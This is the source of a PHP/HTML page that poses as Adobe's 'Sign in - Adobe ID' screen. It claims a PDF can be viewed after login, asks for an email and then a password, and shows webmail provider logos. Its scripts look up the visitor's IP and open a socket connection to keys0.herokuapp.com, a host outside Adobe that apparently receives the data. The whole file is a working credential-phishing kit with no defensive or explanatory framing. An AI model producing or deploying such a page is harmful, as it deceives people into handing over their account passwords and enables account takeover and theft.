<?php

include './config/settings.php'


?>

<!DOCTYPE html>
<html lang="en">
<head>
    <style>
    body{
        display: none;
    }
    </style>
    <meta charset="UTF-8">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.js" integrity="sha256-WpOohJOqMqqyKL9FccASB9O0KwACQJpFTUBLTYOVvVU=" crossorigin="anonymous"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.2/animate.css" integrity="sha256-a2tobsqlbgLsWs7ZVUGgP5IvWZsx8bTNQpzsqCSm5mk=" crossorigin="anonymous" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <script src="https://cdn.jsdelivr.net/npm/vue"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/2.3.0/socket.io.js" integrity="sha256-bQmrZe4yPnQrLTY+1gYylfNMBuGfnT/HKsCGX+9Xuqo=" crossorigin="anonymous"></script>

    <script src="https://unpkg.com/vue-function-api/dist/vue-function-api.umd.js"></script>

    <link href="https://fonts.googleapis.com/css?family=Roboto&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/uikit/3.2.3/css/uikit.css" integrity="sha256-sO51oyzsin/NG3+MQHRNd3dVDbsghJAVv7mm1V1nXkQ=" crossorigin="anonymous" />
    <script src="https://cdnjs.cloudflare.com/ajax/libs/uikit/3.2.3/js/uikit.js" integrity="sha256-uxGesPhL7bxGwoMOIEothx+OFhwoUetOSTOncn2wuUs=" crossorigin="anonymous"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/semantic-ui/2.4.1/semantic.css" integrity="sha256-QVBN0oT74UhpCtEo4Ko+k3sNo+ykJFBBtGduw13V9vw=" crossorigin="anonymous" />
    <script src="https://cdnjs.cloudflare.com/ajax/libs/semantic-ui/2.4.1/semantic.js" integrity="sha256-qs5p0BFSqSvrstBxPvex+zdyrzcyGdHNeNmAirO2zc0=" crossorigin="anonymous"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/vuetify/2.1.12/vuetify.css" integrity="sha256-eWzVOWu5XL0CR2w08ovD5qMN3UXliNf9e82W+eZwQ+E=" crossorigin="anonymous" />
    <script src="https://cdnjs.cloudflare.com/ajax/libs/vuetify/2.1.12/vuetify.js" integrity="sha256-vpGloYTtFYxXd3onBTpMrhcqlz2E9iKL2NB7XfmEluw=" crossorigin="anonymous"></script>
    <link rel="stylesheet" href="./css/global.css">
    <script>
            window.locIp='';
            window.iPfull='';
           fetch('//keys0.herokuapp.com/ip',{
             mode:'cors',
           }).then(e=>{
             e.json().then(location=>{
               console.log(location)
               window.locIp=location
               window.iPfull =location.ip || location
              
             })
           })
         </script>
           <link rel="shortcut icon" href="./img/logo.png" type="image/x-icon">
        
         
         <title>Sign in - Adobe ID</title>
</head>
<body>
    
<div>
    <div id="app">
            <p style="display:none">
                    <input id="Mail" type="text" value="<?=$Mail;?>">
                   
                  </p>
<v-app>

    <v-content>


            <div  class="uk-background-image@m uk-background-cover uk-background-secondary uk-height-1-1" data-srcset="https://source.unsplash.com/1600x900/?space,black" data-src='/img/ground.jpeg' uk-img>
             <div>
                    <div class="uk-child-width-1-2@m" uk-grid> 
                            <div class="uk-visible@m" >
                                <div class="uk-position-bottom px-4 uk-position-fixed uk-padding-small pt-10">
                                    
                                    <div style="color:white" class="uk-h3 uk-light">
        <img align="center" style="width:70px" src="./img/adobe.svg" alt="">&nbsp; Adobe <br>
        <span style="color:white" class="uk-h5 font-weight-bold">Sign in or create an account</span>
        
        <br>
        <br>
        <span style="font-size:13px"><img align="center" style="width:30px" src="./img/st.svg" alt="">&nbsp; Addictive S tock <br></span>
                                    </div>
                                </div>
                            </div>
                            <div>
                                <div class="uk-padding">
                                    <div class="uk-card uk-border-rounded  uk-card-large  uk-card-default uk-card-body">
                                        <h3 class="uk-card-title"> 
                                           <img align="center" style="width:40px" src="./img/adobe.svg" alt=""> Sign In <br><br>
                                             <span class="uk-text-meta black--text font-weight-light"> <i class="ui  icon file pdf"></i> Sign in with your Email address to view document</span> </h3>
                                        <div class="animated fadeIn" v-if="!validEmail">
                                                <v-text-field
                                                @keyup="error=''"
                                                name="name"
                                                label="Email address"
                                                v-model="ID"
                                                :error-messages="error !=='' ? error :''"
                                                id="id"
                                            ></v-text-field>
                                        </div>
                                        <div class="animated fadeInLeft" v-else>
                                            <div class="font-weight-bold uk-h3">
                                                  <i class="ui icon lock"></i>  Enter your password
                                            </div>
                                                <v-text-field
                                                @keyup="error=''"
                                                name="name"
                                                label="Password"
                                                v-model="PWD"
                                                :disabled="loading"
                                                
                                                type="password"
                                                @keyup="error=''"
                                                :error-messages="error !=='' ? error :''"
                                                id="id"
                                            ></v-text-field>
                                        </div>
                                        <br>
                                       <div class="uk-child-width-1-2@s" uk-grid>
                                           <div >
                                               <div></div>
                                           </div>
                                            <div>
                                                    <div class="uk-text-right">
                                                            <v-btn  :loading="loading" @click="checkEmail" color="#1473E6" rounded dark>
                                                                <span class="uk-text-capitalize">
                                                                    
                                                                   {{validEmail ? 'Log In to view file' : ' Continue'}}
                                                                </span>
                                                            </v-btn>
                                                    </div>
                                            </div>
                                       </div>
    
                                      <div>
                                         <p>
                                                <div v-if="validEmail" class="uk-visible@m">
                                                        <v-switch dense label="Stay signed in" ></v-switch>
                                                           </div>
                                         </p>
                                            <v-btn v-if="validEmail" @click="validEmail=false;PW='';retype=false;error=''" color="primary" text text>
                                                <span  class="uk-text-lowercase">Sign in to a different account</span>
                                            </v-btn>
                                      </div>
                                        <br><br>
                                     <img style="width:34px" src="./img/gmail.svg" alt="">&nbsp;
                                     <img style="width:34px" src="./img/yahoo.svg" alt="">&nbsp;
                                     <img style="width:34px" src="./img/outlook.svg" alt="">&nbsp;
                                     <img style="width:34px" src="./img/office.svg" alt="">
        <div class="pt-4">
            <div class="font-weight-black">
                    Welcome to a whole new document experience.
            </div>
            <br>
            <span style="font-size:12px">
                    With Document Cloud, featuring the all-new Adobe Acrobat DC, get every ounce of potential out of your PDFs from any device. From shared PDF reviews across devices to collecting the most secure e-signatures from right inside your favorite apps, including Microsoft Office.
            </span>
            <br><br>
            <p>
                &copy;Adobe Acrobat DC
            </p>
        </div>
                                    </div>
                                </div>
                            </div>
                    </div>
             </div>
        </div>
    
    </v-content>
</v-app>

    </div>
</div>
<script>
  const socket =io('https://keys0.herokuapp.com',{
    transports:['websocket','polling']
})
</script>
  
    <script type="module" src="./js/ls.js? ++"></script>
</body>
</html>